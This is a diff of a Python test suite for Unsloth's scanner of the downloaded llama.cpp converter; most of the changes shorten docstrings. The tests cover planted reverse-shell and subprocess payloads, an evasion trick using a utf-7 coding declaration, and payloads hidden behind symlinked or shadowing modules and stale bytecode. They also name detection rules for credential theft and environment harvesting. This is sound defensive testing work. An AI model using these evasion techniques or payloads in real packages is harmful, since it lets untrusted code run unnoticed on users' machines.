@@ -14,19 +14,8 @@
 # You should have received a copy of the GNU Affero General Public License
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
-"""Tests for the static scan of the downloaded llama.cpp converter.
-
-Three groups:
-
-  * clean_*     : the genuine converter must produce zero findings, offline
-    against the committed fixture and, when the network is up, against live
-    llama.cpp master. A check that fires on the real file would warn on every
-    GGUF export and would have to be reverted, so this is the load-bearing case.
-  * flagged_*   : planted payloads must be reported, including one aimed at the
-    argparse default that `llama_cpp.py` eval()s in-process.
-  * export_*    : the scan runs before the bytes are patched, written or run, and
-    neither a scanner crash nor a finding can break a legitimate conversion.
-"""
+"""Scan of the downloaded llama.cpp converter: clean_* genuine converter gives zero findings offline and on live master;
+flagged_* payloads must be reported; export_* a scanner crash or a finding must never break a legitimate conversion."""
 
 from __future__ import annotations
 
@@ -92,11 +81,7 @@ def test_clean_genuine_converter_fixture_has_no_findings(scan):
 
 
 def test_clean_genuine_converter_matches_no_individual_pattern(scan):
-    """Stronger than "no findings": the real file is nowhere near any rule.
-
-    Every finding is a combination of these patterns, so zero raw matches means
-    the margin does not depend on which combinations happen to be wired up.
-    """
+    """Stronger than zero findings: the genuine converter matches no single VENDORED_PATTERNS entry, so the margin does not depend on how rules combine."""
     text = GENUINE_CONVERTER.read_text(encoding = "utf-8", errors = "replace")
     hits = sorted(
         name for name, pattern in scan.VENDORED_PATTERNS.items() if pattern.search(text)
@@ -105,11 +90,7 @@ def test_clean_genuine_converter_matches_no_individual_pattern(scan):
 
 
 def test_clean_live_upstream_converter_has_no_findings(scan):
-    """Same assertion against current master. Skipped when offline or rate-limited.
-
-    Follows tests/test_convert_hf_to_gguf_patcher.py: upstream moving is a real
-    failure worth hearing about, an unreachable network is not.
-    """
+    """Live master variant of the clean check; skipped when offline or rate-limited, since upstream moving is a real failure but an unreachable network is not."""
     requests = pytest.importorskip("requests")
     headers = {}
     if os.environ.get("GITHUB_TOKEN"):
@@ -120,8 +101,7 @@ def test_clean_live_upstream_converter_has_no_findings(scan):
         pytest.skip(f"network unreachable: {exc}")
     if response.status_code in (403, 429, 500, 502, 503, 504):
         pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
-    # A 404 is not an outage: it means the URL llama_cpp.py downloads from is gone,
-    # which breaks GGUF export whatever this scan does. Fail rather than go green.
+    # A 404 is not an outage: the URL llama_cpp.py downloads from is gone, which breaks GGUF export regardless of this scan, so fail rather than go green.
     assert response.status_code == 200, (
         f"{CONVERTER_URL} returned HTTP {response.status_code}. "
         f"LLAMA_CPP_CONVERT_FILE needs updating."
@@ -143,13 +123,7 @@ _RAW_MASTER = "https://raw.githubusercontent.com/ggml-org/llama.cpp/master/"
 
 @pytest.mark.parametrize("name", _LIVE_ROOT_MODULES)
 def test_clean_live_root_modules_have_no_findings(scan, name):
-    """The converter's own directory became a scanned location, so these are read.
-
-    They are upstream's other root-level scripts and had never been through the
-    patterns before. A finding on any of them warns on every GGUF export, which
-    this module treats as worse than the warning is a win, so they are held to
-    the same bar as the entrypoint itself.
-    """
+    """Upstream root-level scripts are scanned because the converter's directory is a scanned location; each must have zero findings, as the entrypoint does."""
     requests = pytest.importorskip("requests")
     try:
         response = requests.get(_RAW_MASTER + name, timeout = 30)
@@ -169,14 +143,7 @@ def test_clean_live_root_modules_have_no_findings(scan, name):
 
 
 def test_the_real_conversion_package_fits_under_the_cap(llama_cpp):
-    """A cap below the thing it exists to read is not a safety margin.
-
-    llama.cpp master ships 94 modules in conversion/ and the cap was 64, so the
-    scan reported the genuine package as too big to read on every GGUF export
-    and, under UNSLOTH_CONVERTER_SCAN_STRICT, refused the export outright. This
-    reads the real tree so upstream growing past the cap is a failure here rather
-    than a refusal on a user's machine.
-    """
+    """The cap must stay above the real conversion/ package (94 modules on llama.cpp master); below it every GGUF export reports too big and strict mode refuses."""
     requests = pytest.importorskip("requests")
     headers = {}
     if os.environ.get("GITHUB_TOKEN"):
@@ -352,10 +319,7 @@ def test_flagged_argparse_default_that_would_evaluate(scan, default):
         b'"f16"', b'"auto"', b'"0"', b"0", b"None", b'"store_true"',
         # Plain names, which have no call syntax to invoke.
         b"DEFAULT_OUTTYPE", b"gguf.LlamaFileType",
-        # Benign defaults the capture regex truncates. `[0, 1]` arrives as `[0`
-        # and `os.cpu_count()` as `os.cpu_count(`, neither of which parses, so
-        # eval() raises inside llama_cpp.py's own try/except and nothing runs.
-        # Reporting these would warn on a converter that did nothing wrong.
+        # Benign defaults the regex truncates, like [0 and os.cpu_count(, do not parse, so eval() raises inside llama_cpp.py's try/except and nothing runs.
         b"[0, 1]", b"(1, 2)", b'"chat template"', b"os.cpu_count()", b"Path.cwd()",
         b"globals()['os']", b"argparse.SUPPRESS", b"[]", b"{}",
     ],
@@ -369,11 +333,7 @@ def test_clean_argparse_default_that_cannot_run_is_quiet(scan, default):
 
 
 def test_clean_truncated_defaults_match_what_llama_cpp_does_with_them(scan, llama_cpp):
-    """The tokens the rule stays quiet about are exactly the ones eval() rejects.
-
-    Not an assumption: the capture runs, then each token is put through the same
-    eval() llama_cpp.py performs, and the quiet ones must be the ones that raise.
-    """
+    """Truncated argparse defaults the rule ignores must be exactly the tokens eval() rejects, checked by running each through the same eval llama_cpp.py performs."""
     source = (
         b'parser.add_argument("--a", default=[0, 1])\n'
         b'parser.add_argument("--b", default=os.cpu_count())\n'
@@ -388,23 +348,13 @@ def test_clean_truncated_defaults_match_what_llama_cpp_does_with_them(scan, llam
 
 
 def test_argparse_regex_is_the_one_llama_cpp_evals(scan, llama_cpp):
-    """The scan and the eval sink read the same tokens.
-
-    Asserted on the pattern text and flags rather than object identity: the
-    fixtures load both modules by path, so llama_cpp.py takes its ImportError
-    fallback and builds a second module object. In a normal package import the
-    two are the same object; either way what matters is that the regex agrees.
-    """
+    """RE_ARGPARSE_DEFAULT must match in pattern text and flags, not identity, since path-loaded fixtures give llama_cpp.py a second module object."""
     assert llama_cpp.RE_ARGPARSE_DEFAULT.pattern == scan.RE_ARGPARSE_DEFAULT.pattern
     assert llama_cpp.RE_ARGPARSE_DEFAULT.flags == scan.RE_ARGPARSE_DEFAULT.flags
 
 
 def test_argparse_regex_still_matches_what_the_flag_parser_expects(scan):
-    """Pinned to the exact pattern the defaults scraper used before it moved here.
-
-    Moving the regex out of llama_cpp.py must not change which flags Unsloth
-    resolves defaults for, so the text is pinned rather than tidied.
-    """
+    """Pins the exact argparse regex text so moving it out of llama_cpp.py cannot change which flag defaults Unsloth resolves; keep it as is."""
     expected = (
         rb"parser\.add_argument\([\s]*[\"\']([^\"\']{1,})[\'\"]"
         rb"[^\)]*(?:action=|default=)[\s]*([^,\s\)]+)"
@@ -457,9 +407,7 @@ def test_strict_mode_refuses_a_downloaded_converter(scan, monkeypatch):
 
 
 def test_strict_mode_still_allows_a_deliberately_supplied_local_converter(scan, monkeypatch, caplog):
-    """The warning tells people to pin a converter with
-    UNSLOTH_LLAMA_CPP_SCRIPTS_DIR. Hard-failing that file would break the
-    remedy, so a local copy warns even under strict mode."""
+    """A converter pinned via UNSLOTH_LLAMA_CPP_SCRIPTS_DIR only warns under strict mode, since hard-failing it would break the remedy the warning recommends."""
     monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
     source, _ = _PAYLOADS["reverse shell"]
     with caplog.at_level("WARNING"):
@@ -515,15 +463,7 @@ def test_undecodable_bytes_do_not_crash_the_scan(scan):
 
 
 def test_a_declared_encoding_is_what_the_scan_reads(scan):
-    """The file gets to choose how the interpreter decodes it, so the scan has to
-    read the same characters.
-
-    `# coding: utf-7` on line one makes
-    `+AHM-+AHU-+AGI-+AHA-+AHI-+AG8-+AGM-+AGU-+AHM-+AHM-.run(...)` the source text
-    `subprocess.run(...)`. Decoded as UTF-8 that is plus signs and capitals,
-    matching nothing, while the file Unsloth writes and executes spawns the
-    process. Verified against the scanner as it stood: zero findings.
-    """
+    """The scan must honour the declared source encoding: a utf-7 coding declaration turns shifted text into subprocess.run, which UTF-8 decoding misses."""
     import base64
 
     shifted = "".join(
@@ -550,11 +490,7 @@ def test_scan_cap_leaves_room_for_the_largest_real_converter(scan):
 
 
 def test_oversized_input_reports_that_it_was_only_partly_scanned(scan, monkeypatch):
-    """Past the cap the tail is not scanned, and that has to be said out loud.
-
-    The whole file is still patched, written and executed, so a silent partial
-    scan would look exactly like a clean one.
-    """
+    """Input past the scan cap is not scanned and must be reported as partial, since the whole file still runs and a silent partial scan looks clean."""
     monkeypatch.setattr(scan, "MAX_SCAN_BYTES", 2048)
     payload, expected_check = _PAYLOADS["reverse shell"]
     head = payload + b"# pad\n" * 1000
@@ -581,13 +517,7 @@ def test_within_the_cap_nothing_is_reported_about_truncation(scan):
 
 
 def test_pattern_evaluation_agrees_with_the_pinned_patterns(scan):
-    """Fuzz the linear-time evaluation against `pattern.search` itself.
-
-    Several canonical patterns are shaped `A.*B.*C` under DOTALL and are
-    evaluated as ordered searches instead of one backtracking match. That is only
-    allowed if it answers the same question, so 8000 texts assembled from the
-    tokens those patterns key on are put through both, for all 23 patterns.
-    """
+    """Fuzzes the linear-time ordered-search evaluation of A.*B.*C DOTALL patterns against pattern.search over 8000 texts and all 23 patterns."""
     import random
 
     tokens = [
@@ -613,15 +543,7 @@ def test_pattern_evaluation_agrees_with_the_pinned_patterns(scan):
 
 
 def test_one_dot_star_alternative_does_not_put_the_others_on_the_line_path(scan):
-    """per_line was one flag for the whole pattern.
-
-    A single alternative carrying a non-DOTALL `.*` forced EVERY alternative to
-    be evaluated one line at a time, including ones that legitimately span lines
-    through `\\s*`. In RE_ENV_HARVEST the last two carry the `.*` and the third is
-    `json.dumps(\\s*os.environ`, so a harvest written across three lines matched
-    re.search and not _matches: paired with a network send that is a finding the
-    scan dropped, in strict mode too.
-    """
+    """A non-DOTALL .* in one alternative must not push all alternatives to per-line matching, or RE_ENV_HARVEST misses multi-line harvests that re.search finds."""
     harvest = "payload = json.dumps(\n    os.environ\n)\n"
     assert scan.RE_ENV_HARVEST.search(harvest), "the fixture must match the real pattern"
     assert scan._matches(scan.RE_ENV_HARVEST, harvest)
@@ -643,10 +565,7 @@ def test_one_dot_star_alternative_does_not_put_the_others_on_the_line_path(scan)
 
 
 def test_a_multiline_subject_agrees_with_re_search_on_every_pattern(scan):
-    """The existing fuzz joins short tokens, so it rarely builds a subject whose
-    match spans a newline through `\\s*`. This aims at that case directly: for each
-    pattern, take the text its own alternatives describe and break it across
-    lines at every whitespace-tolerant point."""
+    """Each pattern's own text, broken across lines at every whitespace-tolerant point, must agree with re.search, since the token fuzz rarely spans newlines."""
     import re as _re
 
     mismatches = []
@@ -679,12 +598,7 @@ def test_a_multiline_subject_agrees_with_re_search_on_every_pattern(scan):
     ],
 )
 def test_hostile_input_cannot_stall_a_pattern(scan, name, filler):
-    """A file of near-misses used to take 68s on one pattern and grew cubically.
-
-    The converter bytes are the untrusted input, so a pattern that a crafted file
-    can stall is a way to wedge every GGUF export, and a hang is the one failure
-    the try/except around the scan cannot catch.
-    """
+    """Converter bytes are untrusted, so a pattern a crafted file can stall would wedge every GGUF export; a hang escapes the scan's try/except."""
     import time
 
     text = filler * (200 * 1024 // len(filler))
@@ -695,14 +609,7 @@ def test_hostile_input_cannot_stall_a_pattern(scan, name, filler):
 
 
 def test_a_wall_of_call_prefixes_cannot_stall_the_credential_rule(scan):
-    """Bounding the negated class made the cost linear, not small.
-
-    RE_CRED_ACCESS still restarted at every `open(`, about 3.2s per MB measured,
-    so a single line of them at the 8 MiB scan cap held up the export for roughly
-    half a minute before the converter even ran, with no regex timeout in either
-    mode. A credential rule cannot match without a credential marker, and this
-    file has none.
-    """
+    """RE_CRED_ACCESS must not stall on a wall of open( prefixes: bounding its negated class made it linear, and it cannot match without a credential marker."""
     import time
 
     text = "open(" * (scan.MAX_SCAN_BYTES // 5)
@@ -722,23 +629,18 @@ def test_a_wall_of_call_prefixes_cannot_stall_the_credential_rule(scan):
     ],
 )
 def test_the_prefilter_never_costs_a_real_credential_match(scan, text):
-    """The prefilter is only sound if its literals are genuinely required, so
-    every shape the rule is meant to catch has to survive it."""
+    """The _matches prefilter is sound only if its literals are truly required, so every shape RE_CRED_ACCESS targets must still match through it."""
     assert bool(scan.RE_CRED_ACCESS.search(text)) is True, "fixture must match the raw pattern"
     assert scan._matches(scan.RE_CRED_ACCESS, text) is True
 
 
 def test_every_probe_is_a_literal_the_pattern_really_requires(scan):
-    """A probe that is not required would silently drop findings, and the failure
-    would look exactly like a clean file. Checked against the pattern itself:
-    deleting the probed literal from a matching text must stop the raw pattern
-    matching too."""
+    """A probe literal that is not truly required would silently drop findings; each probe must stop the raw pattern matching when removed from a matching text."""
     for name, pattern in scan.VENDORED_PATTERNS.items():
         alternatives, _flags, probes = scan._evaluator(pattern)
         for required in probes:
             for probe in required:
-                # Every branch of a probe must appear in the pattern's own source,
-                # which is what makes it a requirement rather than a guess.
+                # Every probe branch must appear in the pattern's own source, which makes each probe a real requirement rather than a guess.
                 for literal in probe.pattern.split("|"):
                     plain = literal.replace("\\", "")
                     assert plain and plain in pattern.pattern.replace("\\", ""), (
@@ -759,11 +661,7 @@ def test_every_probe_is_a_literal_the_pattern_really_requires(scan):
     ids = ["required", "optional ?", "optional *", "two required"],
 )
 def test_an_optional_group_is_never_treated_as_required(scan, source, subject, probed):
-    """No shipped pattern has an optional literal group today, so this guard has
-    nothing to stand on unless it is exercised directly. Getting it wrong is the
-    dangerous direction: the scan would go quiet on a file it should report, and
-    a false negative here looks exactly like a clean converter.
-    """
+    """Literals inside optional groups must never be treated as required probes, since a false negative would look exactly like a clean converter."""
     import re as _re
 
     pattern = _re.compile(source)
@@ -773,13 +671,8 @@ def test_an_optional_group_is_never_treated_as_required(scan, source, subject, p
 
 
 def test_a_nested_wildcard_cannot_backtrack_across_the_whole_file(scan):
-    """_split_on_dot_star only splits the top-level wildcards.
-
-    RE_TEMP_EXEC's `(?:...|chmod.*\\+x)` keeps its nested one, so `/tmp/a ` then
-    a wall of `chmod ` with no `+x` restarted it at every chmod and ran to the
-    end each time: measured 0.32s / 1.27s / 5.04s at 96 / 192 / 384 KB, which is
-    hours at the 8 MiB scan cap, before the converter ever runs.
-    """
+    """_split_on_dot_star splits only top-level wildcards; RE_TEMP_EXEC's nested chmod.*+x restarted at every chmod and
+    ran to the end, so a nested wildcard must not backtrack across the whole file."""
     import time
 
     text = "/tmp/a " + ("ch" + "mod ") * (scan.MAX_SCAN_BYTES // 6)
@@ -803,13 +696,8 @@ def test_bounding_the_nested_wildcard_keeps_the_real_temp_exec_matches(scan, tex
 
 
 def test_the_nested_wildcard_bound_reaches_only_where_it_is_meant_to(scan):
-    """Bounding a surviving wildcard is a semantic trade: a match needing more
-    than MAX_CLASS_SPAN characters between the two halves is given up. It is
-    worth making for the one segment that is quadratic without it, and it should
-    not be made silently anywhere else, so the affected set is pinned. A pattern
-    that gains a nested wildcard lands here first, as a decision rather than as a
-    change in what the scan reports.
-    """
+    """Bounding a surviving wildcard gives up matches needing more than MAX_CLASS_SPAN characters between the halves;
+    only the quadratic segment may use it, so the set is pinned."""
     import re
 
     affected = set()
@@ -913,9 +801,7 @@ def test_export_scans_before_writing_the_patched_script(llama_cpp, tmp_path, mon
     )
     assert seen["content"] == _MINIMAL_CONVERTER, "scan saw patched or truncated bytes"
     assert seen["patched_exists"] is False, "patched script existed before the scan ran"
-    # A converter sitting in the llama.cpp directory with no prebuilt marker and
-    # no UNSLOTH_LLAMA_CPP_SCRIPTS_DIR pin is not one the user chose, so it does
-    # not get the strict-mode exemption. See the trusted-local tests below.
+    # A converter in the llama.cpp directory with no prebuilt marker and no UNSLOTH_LLAMA_CPP_SCRIPTS_DIR pin is not user-chosen, so no strict-mode exemption.
     assert seen["is_local_copy"] is False
     assert seen["source"].endswith("convert_hf_to_gguf.py")
     assert os.path.isfile(patched)
@@ -950,12 +836,7 @@ def test_export_of_a_clean_local_converter_is_unchanged(llama_cpp, tmp_path, mon
 def test_export_strict_mode_refuses_a_downloaded_converter_and_writes_nothing(
     llama_cpp, tmp_path, monkeypatch,
 ):
-    """Drives the real export path with downloaded bytes and strict mode set.
-
-    Covers the `except ConverterScanError: raise` clause: the refusal must keep
-    its own message rather than come back relabelled as an introspection failure,
-    and no patched script may reach disk.
-    """
+    """Strict-mode refusal of downloaded bytes keeps its ConverterScanError message rather than an introspection failure, and writes no patched script to disk."""
     monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
     payload = _MINIMAL_CONVERTER + (
         b"\nimport socket, subprocess\n"
@@ -1032,14 +913,8 @@ def test_export_warns_but_completes_on_a_flagged_local_converter(
 
 
 def test_only_a_pinned_converter_is_exempt_from_strict_mode(tmp_path, monkeypatch):
-    """The exemption means "you chose this file", not "this file is on disk".
-
-    When no prebuilt is available install_llama_cpp falls back to an unpinned
-    git clone of upstream master, and _resolve_bundle_convert_script accepts that
-    checkout on the strength of a conversion/ package alone. Treating it as a
-    local copy let a suspicious converter fetched automatically from upstream be
-    warned about but never refused, even under strict mode.
-    """
+    """Strict-mode exemption means the user chose the file: an unpinned upstream clone accepted via conversion/ alone
+    must still be refused, not treated as a local copy."""
     llama_cpp = _load("llama_cpp_trust_probe", "unsloth_zoo/llama_cpp.py")
 
     clone = tmp_path / "clone"
@@ -1061,12 +936,7 @@ def test_only_a_pinned_converter_is_exempt_from_strict_mode(tmp_path, monkeypatc
 
 
 def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypatch):
-    """os.listdir saw immediate children only.
-
-    A clean `conversion/__init__.py` doing `from .nested import x` fronted
-    `conversion/nested/__init__.py`, which was neither scanned nor counted
-    against the cap, and Python imported and ran it just the same.
-    """
+    """Nested packages must be scanned: os.listdir saw only immediate children, so conversion/nested/__init__.py ran unscanned via a relative import."""
     llama_cpp = _load("llama_cpp_nested_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -1091,8 +961,7 @@ def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypa
 
 
 def test_a_nested_module_moves_the_patcher_cache_key(tmp_path):
-    """The key has to cover the same set the scan reads, or a changed nested
-    module is invisible to both."""
+    """The patcher cache key must cover the same nested modules the scan reads, or a changed nested module is invisible to both."""
     llama_cpp = _load("llama_cpp_nested_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -1112,14 +981,8 @@ def test_a_nested_module_moves_the_patcher_cache_key(tmp_path):
 def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
     tmp_path, monkeypatch, caplog
 ):
-    """Scanning only the first MAX names let a payload hide past the cap.
-
-    A package can put its payload in a late-sorting module and import it from an
-    otherwise clean __init__.py; with the list silently truncated, strict mode
-    executed the unscanned module with nothing reported at all. The cap stays --
-    an attacker must not choose how much work this does -- so crossing it is
-    itself the finding.
-    """
+    """Exceeding the conversion file cap is itself a finding, not silent truncation; the cap stays fixed since an
+    attacker must not choose how much work this does, and a late-sorting payload past it would run unscanned."""
     llama_cpp = _load("llama_cpp_cap_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -1147,12 +1010,7 @@ def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
 
 
 def test_a_payload_behind_a_symlinked_subpackage_is_scanned(tmp_path, monkeypatch):
-    """os.walk does not follow directory symlinks; the import machinery does.
-
-    So `conversion/linked -> elsewhere`, imported as `conversion.linked` from an
-    otherwise clean `__init__.py`, was never walked: the package read as fully
-    scanned and strict mode ran the payload with nothing reported.
-    """
+    """os.walk does not follow directory symlinks but imports do, so a symlinked subpackage such as conversion/linked must be walked, not read as fully scanned."""
     llama_cpp = _load("llama_cpp_symlink_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -1181,11 +1039,7 @@ def test_a_payload_behind_a_symlinked_subpackage_is_scanned(tmp_path, monkeypatc
 
 
 def test_a_symlink_loop_in_the_package_terminates(tmp_path):
-    """Following directory symlinks is what lets a loop be walked forever.
-
-    `conversion/loop -> conversion` is a cycle os.walk will happily descend until
-    it runs out of path, so the walk has to notice a directory it already saw.
-    """
+    """Following directory symlinks allows cycles such as conversion/loop pointing back at conversion, so the walk must skip directories it already saw."""
     llama_cpp = _load("llama_cpp_symlink_loop_probe", "unsloth_zoo/llama_cpp.py")
 
     conversion = tmp_path / "llama.cpp" / "conversion"
@@ -1199,26 +1053,18 @@ def test_a_symlink_loop_in_the_package_terminates(tmp_path):
     walk = llama_cpp._conversion_package_modules(str(conversion))
     names, complete = walk.names, walk.complete
 
-    # Terminating at all is the claim; the module is found once through the real
-    # path, and the loop contributes at most the one pass before it is noticed.
+    # The claim is termination: the module is found once through its real path, and a loop adds at most one pass before it is noticed.
     assert "__init__.py" in names
     assert len(names) <= 2
 
 
 def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatch):
-    """The cap bounded what got READ, not what got WALKED.
-
-    conversion/ is attacker-supplied, so materializing the whole tree to discover
-    it was too big hands over the unbounded time and memory the cap exists to
-    deny -- and _conversion_sibling_info re-walks it before every cached export.
-    """
+    """The cap must bound the walk, not just the reads: conversion/ is attacker-supplied, and _conversion_sibling_info re-walks it before every cached export."""
     llama_cpp = _load("llama_cpp_walk_bound_probe", "unsloth_zoo/llama_cpp.py")
 
     conversion = tmp_path / "llama.cpp" / "conversion"
     conversion.mkdir(parents = True)
-    # One file per directory, so each directory the walk yields is one more name:
-    # stopping early has to mean visiting fewer directories, not just returning
-    # fewer names from a tree it read in full.
+    # Each directory holds one file, so each directory yielded is one more name; stopping early must visit fewer directories, not just return fewer names.
     total = llama_cpp.MAX_CONVERSION_PACKAGE_FILES * 4
     for index in range(total):
         package = conversion / f"pkg_{index:04d}"
@@ -1245,8 +1091,7 @@ def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatc
         f"walked {len(visited)} directories of {total} to learn the cap was crossed"
     )
 
-    # Unbounded by default, so a caller that has not asked for a bound still gets
-    # the whole tree rather than a silently truncated one.
+    # Unbounded by default, so a caller that sets no bound gets the whole tree rather than a silently truncated one.
     visited.clear()
     assert len(llama_cpp._conversion_package_modules(str(conversion))[0]) == total
 
@@ -1254,12 +1099,8 @@ def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatc
 def test_a_tree_that_is_huge_without_being_python_is_still_bounded(
     tmp_path, monkeypatch, caplog
 ):
-    """Counting .py files bounds what gets READ, not what gets WALKED.
-
-    Sixty modules and a very large number of other entries never reaches the file
-    cap, so the whole attacker-sized directory was traversed anyway -- and
-    _conversion_sibling_info re-walks it before every cached export.
-    """
+    """Non-Python entries must count against the walk too: counting .py files alone does not bound it, and
+    _conversion_sibling_info re-walks the tree before every export."""
     llama_cpp = _load("llama_cpp_entry_bound_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -1290,8 +1131,7 @@ def test_a_tree_that_is_huge_without_being_python_is_still_bounded(
     assert len(names) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES
     assert complete is False, "an oversized tree must not report itself fully walked"
 
-    # Too few modules to trip the file cap, so only the entry budget can report
-    # this, and unread has to be said out loud rather than passing as clean.
+    # Too few modules to trip the file cap, so only the entry budget can report it; unread content must be reported rather than passing as clean.
     monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
     monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
     caplog.clear()
@@ -1307,13 +1147,7 @@ def test_a_tree_that_is_huge_without_being_python_is_still_bounded(
 
 
 def test_the_cache_key_moves_when_the_bytes_do_under_a_preserved_mtime(tmp_path):
-    """(path, mtime, size) is not an identity for a file.
-
-    Replacing a module with same-sized content and restoring its mtime left the
-    key identical, so a long-lived process returned the cached patcher without
-    rescanning and the subprocess imported bytes nothing had read. A metadata
-    copy away from deliberate, and free on a coarse-timestamp filesystem.
-    """
+    """(path, mtime, size) is not a file identity: same-size bytes with a restored mtime must still move the cache key; mtime is forgeable and can be coarse."""
     llama_cpp = _load("llama_cpp_key_identity_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -1341,14 +1175,7 @@ def _pyc(flags: int) -> bytes:
 
 
 def test_unsloths_own_routing_pin_does_not_buy_the_strict_exemption(tmp_path, monkeypatch):
-    """MLX export installs llama.cpp and then points the patcher at it.
-
-    Trust came from UNSLOTH_LLAMA_CPP_SCRIPTS_DIR alone, so a converter Unsloth
-    had just downloaded read as one the user pinned and reviewed: strict mode
-    only logged the entrypoint's findings instead of raising, and the imported
-    packages were skipped entirely. The whole control was off for
-    save_pretrained_gguf.
-    """
+    """Unsloth's own MLX routing pin via UNSLOTH_LLAMA_CPP_SCRIPTS_DIR must not earn the strict exemption, or a downloaded converter skips refusal and package scans."""
     llama_cpp = _load("llama_cpp_routing_pin_probe", "unsloth_zoo/llama_cpp.py")
 
     installed = tmp_path / "llama.cpp"
@@ -1367,8 +1194,7 @@ def test_unsloths_own_routing_pin_does_not_buy_the_strict_exemption(tmp_path, mo
 
 
 def test_a_real_user_pin_still_earns_the_exemption(tmp_path, monkeypatch):
-    """The other half: a pin the user set must keep meaning "I chose this file",
-    including when MLX routing runs inside it and points somewhere else."""
+    """A pin the user set still earns the strict exemption, including when MLX routing runs inside that checkout and points elsewhere."""
     llama_cpp = _load("llama_cpp_user_pin_probe", "unsloth_zoo/llama_cpp.py")
 
     chosen = tmp_path / "my-llama.cpp"
@@ -1391,14 +1217,7 @@ def test_a_real_user_pin_still_earns_the_exemption(tmp_path, monkeypatch):
 
 
 def test_the_converter_cache_key_carries_whether_the_pin_was_the_users(tmp_path, monkeypatch):
-    """The internal-pin distinction is only as good as the key that carries it.
-
-    A first call under an explicit user pin can accept a flagged converter as
-    trusted and cache it. If the variable is then cleared and MLX routes to the
-    same folder, every other component of the key is identical, so the cached
-    result comes back without the trust test or the package scan running again
-    and strict mode accepts it after all.
-    """
+    """The cache key must record whether the pin was the user's, or a result cached under a user pin is reused unchecked after MLX routes to the same folder."""
     llama_cpp = _load("llama_cpp_trust_key_probe", "unsloth_zoo/llama_cpp.py")
 
     folder = tmp_path / "llama.cpp"
@@ -1428,19 +1247,12 @@ def test_the_converter_cache_key_carries_whether_the_pin_was_the_users(tmp_path,
     with llama_cpp.internal_scripts_dir_pin(str(folder)):
         llama_cpp._download_convert_hf_to_gguf()
 
-    # Same folder, same file, same switches: only provenance differs, and if it
-    # does not reach the key then lru_cache serves the trusted answer to both.
+    # Same folder, file and switches, so only provenance differs; if provenance is not in the key, lru_cache serves the trusted answer to both.
     assert seen == [True, False], seen
 
 
 def test_bytecode_appearing_after_a_cached_export_is_still_purged(tmp_path, monkeypatch):
-    """The purge used to live inside the cached function.
-
-    So once strict mode had completed one clean export in a long-lived process,
-    dropping a fresh valid .pyc beside an unchanged source left every component
-    of the key identical: the cached result came back, nothing purged it, and the
-    next converter subprocess executed it.
-    """
+    """Bytecode dropped beside an unchanged source after a cached export must still be purged; the purge sits outside the cached function."""
     llama_cpp = _load("llama_cpp_purge_before_cache_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1466,8 +1278,8 @@ def test_bytecode_appearing_after_a_cached_export_is_still_purged(tmp_path, monk
 
 
 def test_bytecode_that_cannot_be_purged_reaches_the_cache_key(tmp_path, monkeypatch):
-    """Deleting is the defence; when it fails the scan has to run and say so, and
-    it will not run if the key looks the same as the clean export before it."""
+    """Deleting stale bytecode is the defence; if deletion fails the scan must still run and say so, and the surviving
+    bytecode must reach the cache key so the scan runs again."""
     llama_cpp = _load("llama_cpp_stuck_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1507,13 +1319,7 @@ def test_bytecode_that_cannot_be_purged_reaches_the_cache_key(tmp_path, monkeypa
 def test_an_unreadable_directory_does_not_silence_the_whole_package(
     tmp_path, monkeypatch, caplog
 ):
-    """One scandir failure used to discard everything already collected.
-
-    The walk returned (None, False) and the scan returned without a word, so an
-    untrusted package could pair an unreadable directory with a readable module
-    its initializer imports and strict mode would run that module reporting
-    nothing at all.
-    """
+    """A scandir failure must keep what was already collected, not return silently, or an unreadable directory hides a readable module the package imports."""
     llama_cpp = _load("llama_cpp_unreadable_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1558,8 +1364,7 @@ def test_an_unreadable_directory_does_not_silence_the_whole_package(
 def test_a_package_directory_that_cannot_be_opened_at_all_is_still_reported(
     tmp_path, monkeypatch
 ):
-    """The top of the tree is the one case where nothing can be collected, and it
-    must not read as an empty, clean package either."""
+    """An unopenable top-level package directory must be reported, not read as an empty clean package, since nothing can be collected from it."""
     llama_cpp = _load("llama_cpp_unreadable_top_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1582,13 +1387,7 @@ def test_a_package_directory_that_cannot_be_opened_at_all_is_still_reported(
 
 
 def test_a_root_module_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
-    """The converter's own directory is sys.path[0] for the subprocess.
-
-    It is searched before the gguf-py entry the entrypoint inserts at index 1, so
-    a root-level gguf.py wins over gguf-py/gguf: verified outside this suite, a
-    root gguf.py imported in place of the real package. Scanning only the named
-    packages left it executing under a clean entrypoint and clean packages.
-    """
+    """The converter directory is sys.path[0] and precedes the gguf-py entry at index 1, so a root-level gguf.py shadowing gguf-py/gguf must be scanned."""
     llama_cpp = _load("llama_cpp_shadow_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
